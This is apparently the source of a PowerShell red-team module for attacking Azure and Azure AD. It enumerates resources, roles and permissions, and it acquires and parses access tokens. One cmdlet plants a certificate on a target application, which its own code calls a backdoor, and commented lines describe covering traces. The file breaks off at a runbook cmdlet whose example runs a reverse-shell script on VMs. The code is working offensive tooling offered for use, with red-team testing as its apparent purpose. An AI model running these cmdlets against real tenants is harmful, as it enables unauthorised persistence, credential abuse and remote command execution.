#
# Azure Red Team Powershell module.
#
# Set of useful cmdlets used to collect reconnessaince data, query Azure, Azure AD or Office365 for valuable intelligence and perform various offensive
# activities using solely JWT Access Token or by interacting with related Powershell modules (Az, AzureAD, AzureADPreview) as well as AZ CLI.
#
# Requirements:
#   Az
#   AzureAD
#
# Author: 
#  Mariusz Banach / mgeeky, '22
#  <mb [at] binary-offensive.com>    
#

Function Get-ARTWhoami {
    <#
    .DESCRIPTION
        Pulls current context information from Az and AzureAD modules and presents them bit nicer.

    .EXAMPLE
        PS> Get-ARTWhoami
    #>

    $EA = $ErrorActionPreference
    $ErrorActionPreference = 'silentlycontinue'

    Write-Host ""

    try {
        $AzContext = Get-AzContext
        Write-Host "== Azure context:"

        $AzContext | Select Name,Account,Subscription,Tenant | fl

    } catch {
        Write-Warning "[!] Not authenticated to Azure.`n"
    }

    try {
        $AzADCurrSess = Get-AzureADCurrentSessionInfo
        #$AzADTenantDetail = Get-AzureADTenantDetail


        Write-Host "== Azure AD context:"

        $AzADCurrSess | Select Account,Environment,Tenant,TenantDomain | fl

    } catch {
        Write-Warning "[!] Not authenticated to Azure AD.`n"
    }

    try {
        $AzCli = az account show | convertfrom-json

        Write-Host "== AZ CLI context:"

        $Coll = New-Object System.Collections.ArrayList
        
        $obj = [PSCustomObject]@{
            Username    = $AzCli.User.Name
            Usertype    = $AzCli.User.Type
            TenantId    = $AzCli.tenantId
            TenantName  = $AzCli.name
            Environment = $AzCli.EnvironmentName
        }

        $null = $Coll.Add($obj)
        
        $Coll | fl

    } catch {
        Write-Warning "[!] Not authenticated to AZ CLI.`n"
    }

    $ErrorActionPreference = $EA
}

Function Parse-JWTtokenRT {
    [alias("Parse-JWTokenRT")]
    <#
    .DESCRIPTION
        Parses input JWT token and prints it out nicely.

    .PARAMETER Token
        JWT token to parse.

    .EXAMPLE
        PS> Parse-JWTtokenRT -Token $token
    #>

    [cmdletbinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        $Token,

        [Switch]
        $Json
    )
 
    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid JWT token!" -ErrorAction Stop }
     
        $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
     
        while ($tokenheader.Length % 4) { $tokenheader += "=" }
     
        $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
        while ($tokenPayload.Length % 4) { $tokenPayload += "=" }
     
        $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
        $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
        $tokobj = $tokenArray | ConvertFrom-Json

        if ([bool]($tokobj.PSobject.Properties.name -match "iat")) {
            $tokobj.iat = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.iat)
        }

        if ([bool]($tokobj.PSobject.Properties.name -match "nbf")) {
            $tokobj.nbf = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.nbf)
        }

        if ([bool]($tokobj.PSobject.Properties.name -match "exp")) {
            $tokobj.exp = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.exp)
        }

        if ([bool]($tokobj.PSobject.Properties.name -match "xms_tcdt")) {
            $tokobj.xms_tcdt = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.xms_tcdt)
        }

        if($Json) {
            Return ($tokobj | ConvertTo-Json)
        }
        
        return $tokobj
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Connect-ART {
    <#
    .DESCRIPTION
        h

    .PARAMETER AccessToken
        Specifies JWT Access Token for the https://management.azure.com resource.

    .PARAMETER KeyVaultAccessToken 
        Optional access token for Key Vault service (https://vault.azure.net).

    .PARAMETER SubscriptionId
        Optional parameter that specifies to which subscription should access token be acquired.

    .PARAMETER TokenFromAzCli
        Use az cli to acquire fresh access token.

    .PARAMETER Username
        Specifies Azure portal username.

    .PARAMETER Password
        Specifies Azure portal password.

    .EXAMPLE
        PS> Connect-ART -AccessToken 'eyJ0eXA...'
        PS> Connect-ART -Username test@test.onmicrosoft.com -Password Foobar123%
    #>

    [CmdletBinding(DefaultParameterSetName = 'Token')]
    Param(
        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $AccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $KeyVaultAccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $SubscriptionId = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [Switch]
        $TokenFromAzCli,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Username = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Password = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if (-not (Get-Module -ListAvailable -Name Az.Accounts)) {
            Write-Verbose "Az Powershell module not installed or not loaded. Installing it..."
            Install-Module -Name Az -Force -Confirm -Scope CurrentUser -AllowClobber
        }

        if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
            if($TokenFromAzCli) {
                Write-Verbose "Acquiring Azure access token from az cli..."
                $AccessToken = Get-ARTAccessTokenAzCli -Resource https://management.azure.com
                $KeyVaultAccessToken = Get-ARTAccessTokenAzCli -Resource https://vault.azure.net
            }
            else {
                Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
                $AccessToken = Get-ARTAccessTokenAz -Resource https://management.azure.com
                $KeyVaultAccessToken = Get-ARTAccessTokenAz -Resource https://vault.azure.net
            }
        }

        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
            Write-Verbose "Azure authentication via provided access token..."
            $parsed = Parse-JWTtokenRT $AccessToken
            $tenant = $parsed.tid

            if(-not ($parsed.aud -like 'https://management.*')) {
                Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
            }

            if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.upn
            }
            elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.unique_name
            }
            else {
                Write-Verbose "Token belongs to a Service Principal."
                $account = $parsed.appId
            }

            $headers = @{
                'Authorization' = "Bearer $AccessToken"
            }

            if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) {
                $SubscriptionId = (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId
            }

            if ($KeyVaultAccessToken -eq $null -or $KeyVaultAccessToken.Length -eq 0) { 
                Write-Verbose "Connecting to Azure as Account $account ..."
                Connect-AzAccount -AccessToken $AccessToken -Tenant $tenant -AccountId $account -SubscriptionId $SubscriptionId
            } else {

                $parsedvault = Parse-JWTtokenRT $KeyVaultAccessToken

                if(-not ($parsedvault.aud -eq 'https://vault.azure.net')) {
                    Write-Warning "Provided JWT Key Vault Access Token is not scoped to `"https://vault.azure.net`"! Instead its scope is: `"$($parsedvault.aud)`" . That will not work!"
                }

                Write-Verbose "Connecting to Azure & Azure Vault as Account $account ..."
                Connect-AzAccount -AccessToken $AccessToken -Tenant $tenant -AccountId $account -SubscriptionId $SubscriptionId -KeyVaultAccessToken $KeyVaultAccessToken
            }
        }
        else {
            $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
            
            Write-Verbose "Azure authentication via provided creds..."
            Connect-AzAccount -Credential $creds
        }
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Connect-ARTADServicePrincipal {
    <#
    .DESCRIPTION
        Invokes Connect-AzAccount to authenticate current session to the Azure Portal via provided Access Token or credentials.
        Skips the burden of providing Tenant ID and Account ID by automatically extracting those from provided Token.

        Then it creates self-signed PFX certificate and associates it with Service Principal for authentication.
        Afterwards, authenticates as that Service Principal to AzureAD and deassociates that certificate to cleanup

    .PARAMETER TargetApplicationName
        Specifies Enterprise Application (by Name or ObjectId) which Service Principal is to be used for authentication.

    .EXAMPLE
        Example 1: Connect via Access Token:
            PS> Connect-ARTAD -AccessToken '...'
            PS> Connect-ARTADServicePrincipal -TargetApplicationName testapp1

        Example 2: Connect via PSCredential object:
            PS> $creds = Get-Credential
            PS> Connect-AzureAD -Credential $creds
            PS> Connect-ARTADServicePrincipal -TargetApplicationName testapp1
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $TargetApplicationName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $fname = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
        $certPath = "$Env:Temp\$fname.key.pfx"
        $certStorePath = "cert:\currentuser\my"
        $appKeyIdentifier = "Test123"
        $certpwd = "VeryStrongCertificatePassword123"

        try {
            $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
        }
        catch {
            Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
            Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"

            Throw
            Return
        }

        $UserId = (Get-AzureADUser -Filter "UserPrincipalName eq '$((Get-AzureADCurrentSessionInfo).Account)'").ObjectId

        $pwd = ConvertTo-SecureString -String $certpwd -Force -AsPlainText
        $cert = Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } 

        if($cert -eq $null -or $cert.Thumbprint -eq "") {
            Write-Verbose "Step 1. Create the self signed cert and load it to local store."
            
            $currentDate = Get-Date
            $endDate = $currentDate.AddYears(1)
            $notAfter = $endDate.AddYears(1)

            $thumb = (New-SelfSignedCertificate -CertStoreLocation $certStorePath -DnsName $certDnsName -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
        }
        else {
            Write-Verbose "Step 1. Get self signed cert and load it to local store."
            $cert
            $thumb = $cert.Thumbprint
        }

        Write-Verbose "`t1.1. Export PFX certificate to file: $certPath"
        Export-PfxCertificate -cert "$certStorePath\$thumb" -FilePath $certPath -Password $pwd | Out-Null

        Write-Verbose "Step 2. Load exported certificate"
        Write-Verbose "`t2.1. Certificate Thumbprint: $thumb"

        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate($certPath, $pwd)
        $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

        Write-Verbose "Step 3. Get Service Principal and connect it to the Application."
        $sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '$TargetApplicationName'"
        $app = Get-AzureADApplication | ? { $_.DisplayName -eq $TargetApplicationName -or $_.ObjectId -eq $TargetApplicationName }

        Write-Verbose "Step 4. Backdoor target Azure AD Application with newly created Certificate."
        $key = New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -CustomKeyIdentifier $appKeyIdentifier -StartDate $currentDate -EndDate $endDate -Type AsymmetricX509Cert -Usage Verify -Value $keyValue

        Write-Host "Perform cleanup with command:"
        Write-Host "`tPS> Remove-ARTServicePrincipalKey -ApplicationName $($app.ObjectId) -KeyId $($key.KeyId)"

        Write-Verbose "`nStep 5. Authenticate to Azure AD as a Service Principal."

        try {
            Write-Verbose "`tCooling down for 15 seconds to let Azure account for created certificate.`n"
            Start-Sleep -Seconds 15
            Connect-AzureAD -TenantId $sp.AppOwnerTenantId -ApplicationId $sp.AppId -CertificateThumbprint $thumb | Out-Null
        }
        catch {
            Write-Host "[!] Failed: Could not authenticate to Azure AD as Service Principal!"
            Return
        }

        #Write-Verbose "`n[.] To manually remove backdoor certificate from the Application and cover up traces use following command AS $((Get-AzureADCurrentSessionInfo).Account):`n"
        #Write-Verbose "`tRemove-AzureADApplicationKeyCredential -ObjectId $($app.ObjectId) -KeyId $($key.KeyId)`n"
        #Write-Verbose "`tGet-ChildItem -Path $certStorePath | where { `$_.subject -eq `"CN=$certDnsName`" } | Remove-Item"
        #Write-Verbose "`tRemove-Item -Path $certPath | Out-Null"

        Write-Host "`n`n[+] You are now authenticated as:`n"
        Get-AzureADDomain | Out-Null
        Start-Sleep -Seconds 3
        Get-AzureADCurrentSessionInfo
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Remove-ARTServicePrincipalKey {
    <#
    .DESCRIPTION
        Performs cleanup actions after running Connect-ARTADServicePrincipal

    .PARAMETER ApplicationName
        Specifies Enterprise Application which we want to remove certificate from

    .PARAMETER KeyId
        Specifies Certificate Key ID to remove from target Application.

    .EXAMPLE
        PS> Remove-ARTServicePrincipalKey -ApplicationName testapp1 -KeyId e1be55d2-6369-4100-b063-37c5701182fd
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $ApplicationName,

        [Parameter(Mandatory=$True)]
        [String]
        $KeyId
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $certStorePath = "cert:\currentuser\my"
        $certPath = "$Env:Temp\*.key.pfx"

        try {
            $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
        }
        catch {
            Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
            Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"

            Throw
            Return
        }

        del $certPath | Out-Null
        Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } | Remove-Item

        $app = Get-AzureADApplication | ? { $_.DisplayName -eq $ApplicationName -or $_.ObjectId -eq $ApplicationName }
        Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $KeyId

        Write-Host "[+] Cleanup finished."
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Connect-ARTAD {
    <#
    .DESCRIPTION
        Invokes Connect-AzureAD to authenticate current session to the Azure Active Directory via provided Access Token or credentials.
        Skips the burden of providing Tenant ID and Account ID by automatically extracting those from provided Token.

    .PARAMETER AccessToken
        Specifies JWT Access Token for the https://graph.microsoft.com or https://graph.windows.net resource.

    .PARAMETER TokenFromAzCli
        Use az cli to acquire fresh access token.

    .PARAMETER Username
        Specifies Azure AD username.

    .PARAMETER Password
        Specifies Azure AD password.

    .EXAMPLE
        PS> Connect-ARTAD -AccessToken 'eyJ0eXA...'
        PS> Connect-ARTAD -Username test@test.onmicrosoft.com -Password Foobar123%
    #>

    [CmdletBinding(DefaultParameterSetName = 'Token')]
    Param(
        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $AccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [Switch]
        $TokenFromAzCli,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Username = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Password = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if (-not (Get-Module -ListAvailable -Name AzureAD)) {
            Write-Verbose "AzureAD Powershell module not installed or not loaded. Installing it..."
            Install-Module -Name AzureAD -Force -Confirm -Scope CurrentUser -AllowClobber
        }

        if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
            Write-Verbose "Acquiring Azure access token from Connect-AzureAD..."
            if($TokenFromAzCli) {
                Write-Verbose "Acquiring Azure access token from az cli..."
                $AccessToken = Get-ARTAccessTokenAzCli -Resource https://graph.microsoft.com
            }
            else {
                Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
                $AccessToken = Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
            }
        }

        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
            Write-Verbose "Azure AD authentication via provided access token..."
            $parsed = Parse-JWTtokenRT $AccessToken
            $tenant = $parsed.tid

            if(-not $parsed.aud -like 'https://graph.*') {
                Write-Warning "Provided JWT Access Token is not scoped to https://graph.microsoft.com or https://graph.windows.net! Instead its scope is: $($parsed.aud)"
            }

            if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.upn
            }
            elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.unique_name
            }
            else {
                Write-Verbose "Token belongs to a Service Principal."
                $account = $parsed.appId
            }

            Connect-AzureAD -AadAccessToken $AccessToken -TenantId $tenant -AccountId $account
        }
        else {
            $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
            
            Write-Verbose "Azure AD authentication via provided creds..."
            Connect-AzureAD -Credential $creds
        }
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTAccessTokenAzCli {
    <#
    .DESCRIPTION
        Acquires access token from az cli, via az accound get-access-token

    .PARAMETER AccessToken
        Optionally specifies Azure Application that acquired token should be scoped to.

    .EXAMPLE
        PS> Get-ARTAccessTokenAzCli -Resource https://graph.microsoft.com
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $Resource = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $token = $null

        if($Resource -ne $null -and $Resource.Length -gt 0) {
            $token = ((az account get-access-token --resource $Resource) | ConvertFrom-Json).accessToken
        }
        else {
            $token = ((az account get-access-token) | ConvertFrom-Json).accessToken
        }

        $parsed = Parse-JWTtokenRT $token
        Write-Verbose "Token for Resource: $($parsed.aud)"

        Return $token
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTAccessTokenAz {
    <#
    .DESCRIPTION
        Acquires access token from Az module, via Get-AzAccessToken .

    .PARAMETER AccessToken
        Optionally specifies Azure Application that acquired token should be scoped to.

    .EXAMPLE
        PS> Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $Resource = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $token = $null

        if($Resource -ne $null -and $Resource.Length -gt 0) {
            $token = (Get-AzAccessToken -Resource $Resource).Token
        }
        else {
            $token = (Get-AzAccessToken).Token
        }

        $parsed = Parse-JWTtokenRT $token
        Write-Verbose "Token for Resource: $($parsed.aud)"

        Return $token
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

#
# SOURCE:
#   https://blog.simonw.se/getting-an-access-token-for-azuread-using-powershell-and-device-login-flow/
#
# AUTHOR:
#   Simon Wahlin, @SimonWahlin 
#
function Get-ARTAccessTokenAzureAD {
    <#
    .SYNOPSIS
        Gets an access token from Azure Active Directory

    .DESCRIPTION
        Gets an access token from Azure Active Directory that can be used to authenticate to for example Microsoft Graph or Azure Resource Manager.

        Run without parameters to get an access token to Microsoft Graph and the users original tenant.

        Use the parameter -Interactive and the script will open the sign in experience in the default browser without user having to copy any code.

    .PARAMETER ClientID
        Application client ID, defaults to well-known ID for Microsoft Azure PowerShell

    .PARAMETER Interactive
        Tries to open sign-in experience in default browser. If this succeeds the user don't need to copy and paste any device code.

    .PARAMETER TenantID
        ID of tenant to sign in to, defaults to the tenant where the user was created

    .PARAMETER Resource
        Identifier for target resource, this is where the token will be valid. Defaults to  "https://graph.microsoft.com/"
        Use "https://management.azure.com" to get a token that works with Azure Resource Manager (ARM)

    .EXAMPLE
        $Token = Get-ARTAccessTokenAzureAD -Interactive
        $Headers = @{'Authorization' = "Bearer $Token" }
        $UsersUri = 'https://graph.microsoft.com/v1.0/users?$top=5'
        $Users = Invoke-RestMethod -Method GET -Uri $UsersUri -Headers $Headers
        $Users.value.userprincipalname

        Using Microsoft Graph to print the userprincipalname of 5 users in the tenant.

    .EXAMPLE
        $Token = Get-ARTAccessTokenAzureAD -Interactive -Resource 'https://management.azure.com'
        $Headers = @{'Authorization' = "Bearer $Token" }
        $SubscriptionsURI = 'https://management.azure.com/subscriptions?api-version=2019-11-01'
        $Subscriptions = Invoke-RestMethod -Method GET -Uri $SubscriptionsURI -Headers $Headers
        $Subscriptions.value.displayName

        Using Azure Resource Manager (ARM) to print the display name for all the subscriptions the user has access to.

    .NOTES

    #>

    [cmdletbinding()]
    param( 
        [Parameter()]
        $ClientID = '1950a258-227b-4e31-a9cf-717495945fc2',
        
        [Parameter()]
        [switch]$Interactive,
        
        [Parameter()]
        $TenantID = 'common',
        
        [Parameter()]
        $Resource = "https://graph.microsoft.com/",
        
        # Timeout in seconds to wait for user to complete sign in process
        [Parameter(DontShow)]
        $Timeout = 300
    )
    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $DeviceCodeRequestParams = @{
            Method = 'POST'
            Uri    = "https://login.microsoftonline.com/$TenantID/oauth2/devicecode"
            Body   = @{
                resource  = $Resource
                client_id = $ClientId
            }
        }
        $DeviceCodeRequest = Invoke-RestMethod @DeviceCodeRequestParams

        if ($Interactive.IsPresent) {
            Write-Host 'Trying to open a browser with login prompt. Please sign in.' -ForegroundColor Yellow
            Start-Sleep -Second 1
            $PostParameters = @{otc = $DeviceCodeRequest.user_code }
            $InputFields = foreach ($entry in $PostParameters.GetEnumerator()) {
                "<input type=`"hidden`" name=`"$($entry.Name)`" value=`"$($entry.Value)`">"
            }
            $PostUrl = "https://login.microsoftonline.com/common/oauth2/deviceauth"
            $LocalHTML = @"
        <!DOCTYPE html>
<html>
 <head>
  <title>&hellip;</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <script type="text/javascript">
   function dosubmit() { document.forms[0].submit(); }
  </script>
 </head>
 <body onload="dosubmit();">
  <form action="$PostUrl" method="POST" accept-charset="utf-8">
   $InputFields
  </form>
 </body>
</html>
"@
            $TempPage = New-TemporaryFile
            $TempPage = Rename-Item -Path $TempPage.FullName ($TempPage.FullName -replace '$', '.html') -PassThru    
            Out-File -FilePath $TempPage.FullName -InputObject $LocalHTML
            Start-Process $TempPage.FullName
        }
        else {
            Write-Host $DeviceCodeRequest.message -ForegroundColor Yellow
        }

        $TokenRequestParams = @{
            Method = 'POST'
            Uri    = "https://login.microsoftonline.com/$TenantId/oauth2/token"
            Body   = @{
                grant_type = "urn:ietf:params:oauth:grant-type:device_code"
                code       = $DeviceCodeRequest.device_code
                client_id  = $ClientId
            }
        }
        $TimeoutTimer = [System.Diagnostics.Stopwatch]::StartNew()
        while ([string]::IsNullOrEmpty($TokenRequest.access_token)) {
            if ($TimeoutTimer.Elapsed.TotalSeconds -gt $Timeout) {
                throw 'Login timed out, please try again.'
            }
            $TokenRequest = try {
                Invoke-RestMethod @TokenRequestParams -ErrorAction Stop
            }
            catch {
                $Message = $_.ErrorDetails.Message | ConvertFrom-Json
                if ($Message.error -ne "authorization_pending") {
                    throw
                }
            }
            Start-Sleep -Seconds 1
        }
        Write-Output $TokenRequest.access_token
    }
    finally {
        try {
            Remove-Item -Path $TempPage.FullName -Force -ErrorAction Stop
            $TimeoutTimer.Stop()
        }
        catch {
            # We don't care about errors here
        }
    }
}

Function Get-ARTResource {
    <#
    .DESCRIPTION
        Authenticates to the https://management.azure.com using provided Access Token and pulls accessible resources and permissions that token Owner have against them.

    .PARAMETER AccessToken
        Specifies JWT Access Token for the https://management.azure.com resource.

    .PARAMETER SubscriptionId
        Optional parameter specifying which Subscription should be requested.

    .PARAMETER Text
        If specified, output will be printed as pre-formatted text. By default a Powershell array is returned.

    .EXAMPLE
        PS> Get-ARTResource -AccessToken 'eyJ0eXA...'
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)][String]
        $AccessToken = $null,
        
        [Parameter(Mandatory=$False)][String]
        $SubscriptionId = $null,

        [Switch]
        $Text
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
            Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
            $AccessToken = Get-ARTAccessTokenAz
        }

        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
            Write-Error "Could not obtain required Access Token!"
            Return
        }

        $headers = @{
            'Authorization' = "Bearer $AccessToken"
        }

        $parsed = Parse-JWTtokenRT $AccessToken

        if(-not $parsed.aud -like 'https://management.*') {
            Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
        }

        $resource = $parsed.aud

        Write-Verbose "Will use resource: $resource"

        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
            $SubscriptionId = (Invoke-RestMethod -Uri "$resource/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId 
        }

        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
            Write-Error "Could not acquire Subscription ID!"
            Return
        }

        Write-Verbose "Enumerating resources on subscription: $SubscriptionId"

        $resources = (Invoke-RestMethod -Uri "$resource/subscriptions/$SubscriptionId/resources?api-version=2021-04-01" -Headers $headers).value

        if($resources.Length -eq 0 ) {
            if($Text) {
                Write-Host "No available resourources found or lacking required permissions."
            }
            else {
                Write-Verbose "No available resourources found or lacking required permissions."
            }

            Return
        }

        $Coll = New-Object System.Collections.ArrayList

        $resources | % {
            try
            {
                $permissions = ((Invoke-RestMethod -Uri "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -Headers $headers).value).actions
            }
            catch
            {
                $permissions = @()
            }

            $obj = [PSCustomObject]@{
                Name              = $_.name
                ResourceGroupName = $_.id.Split('/')[4]
                ResourceType      = $_.type
                Permissions       = $permissions
                Scope             = $_.id
            }

            $null = $Coll.Add($obj)
        }

        if ($Text) {
            Write-Host "== Accessible Azure Resources & Permissions ==`n"

            $num = 1
            $Coll | % {
                Write-Host "`n`t$($num)."
                Write-Host "`tName                :`t$($_.Name)"
                Write-Host "`tResource Group Name :`t$($_.ResourceGroupName)"
                Write-Host "`tResource Type       :`t$($_.ResourceType)"
                Write-Host "`tScope               :`t$($_.Scope)"
                Write-Host "`tPermissions: $($_.Permissions.Length)"
                
                $_.Permissions | % {
                    Write-Host "`t`t- $_"
                }

                $num += 1
            }
        }
        else {
            $Coll
        }
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTADRolePermissions {
    <#
    .DESCRIPTION
        Displays all granted permissions on a specified Azure AD role.

    .PARAMETER RoleName
        Name of the role to inspect.

    .EXAMPLE
        PS> Get-ARTADRolePermissions -RoleName "Global Administrator"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RoleName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        (Get-AzureADMSRoleDefinition -Filter "displayName eq '$RoleName'").RolePermissions | select -Expand AllowedResourceActions | Format-List
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTRolePermissions {
    <#
    .DESCRIPTION
        Displays all granted permissions on a specified Azure RBAC role.

    .PARAMETER RoleName
        Name of the role to inspect.

    .EXAMPLE
        PS> Get-ARTRolePermissions -RoleName Owner
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RoleName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        try {
            $role = Get-AzRoleDefinition -Name $RoleName
        }
        catch {
            Write-Host "[!] Could not get Role Definition. Possibly due to lacking privileges or lack of connection."
            Throw
            Return
        }

        Write-Host "Role Name:     $RoleName"
        Write-Host "Is Custom Rol: $($role.IsCustom)"

        if($role.Actions.Length -gt 0 ) {
            Write-Host "`nActions:"
            $role.Actions | % {
                Write-Host "`t- $($_)"
            }
        }

        if($role.NotActions.Length -gt 0 ) {
            Write-Host "`nNotActions:"
            $role.NotActions | % {
                Write-Host "`t- $($_)"
            }
        }

        if($role.DataActions.Length -gt 0 ) {
            Write-Host "`nDataActions:"
            $role.DataActions | % {
                Write-Host "`t- $($_)"
            }
        }

        if($role.NotDataActions.Length -gt 0 ) {
            Write-Host "`nNotDataActions:"
            $role.NotDataActions | % {
                Write-Host "`t- $($_)"
            }
        }

        Write-Host ""
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Invoke-ARTAutomationRunbook {
    <#
    .DESCRIPTION
        Creates an Automation Runbook under specified Automation Account and against selected Worker Group.
        That Runbook will contain Powershell commands to be executed on all the affected Azure VMs.

    .PARAMETER RunbookName
        Specifies Runbook's name to create.

    .PARAMETER ScriptPath
        Path to the Powershell script file.

    .PARAMETER Command
        Command to be executed in Runbook.

    .PARAMETER RemoveAfter
        TODO

    .PARAMETER AutomationAccountName
        TODO

    .PARAMETER ResourceGroupName
        TODO

    .PARAMETER WorkergroupName
        TODO

    .EXAMPLE
        PS> Invoke-ARTAutomationRunbook -RunbookName MyLittleRunbook -ScriptPath .\ReverseShell.ps1 -Verbose
    #>

